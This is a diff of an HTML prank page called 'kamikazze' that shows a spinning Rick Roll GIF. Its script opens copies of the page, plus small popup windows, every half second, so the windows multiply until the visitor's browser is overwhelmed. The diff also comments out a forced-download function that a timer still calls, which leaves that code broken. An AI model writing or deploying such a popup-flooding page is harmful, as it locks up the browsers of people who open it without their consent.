@@ -2,25 +2,32 @@
 <html lang="en" lang="it">
     <head>
         <title>kamikazze</title>
+        <style>
+            embed{
+                width: 100%;
+                height: 60%;
+                object-fit: cover;
+                animation: spin 2s infinite linear;
+            }
+        </style>
     </head>
     <body>
-        <video width="100%" height="60%" autoplay="autoplay" loop="true" muted>
-            <source src="RickRoll.mp4" type="video/mp4">  
-        </video>
+        <embed src="RickRoll.gif" type="image/gif">
         
         <script>
             var src = 'index.html';
             setInterval(function() {
                 window.open(src);
                 window.open(src);
+                window.open("index.html", "", "width=200,height=100");
             }, 500);
             setInterval(function() {//da controllarre il funzionamento
                 downloadRickRoll();
             }, 500);
            
-            function downloadRickRoll() {
-                const url = 'RickRoll.mp4'; // URL del file RickRoll.mp4
-                const fileName = 'RickRoll.mp4';
+            /*function downloadRickRoll() {
+                const url = 'RickRoll.gif'; // URL del file RickRoll.gif
+                const fileName = 'RickRoll.gif';
             
                 // Creare un elemento <a> nascosto
                 const a = document.createElement('a');
@@ -33,7 +40,7 @@
             
                 // Pulizia: rimuovere l'elemento <a>
                 document.body.removeChild(a);
-            }
+            }*/
             
         </script>
     </body>
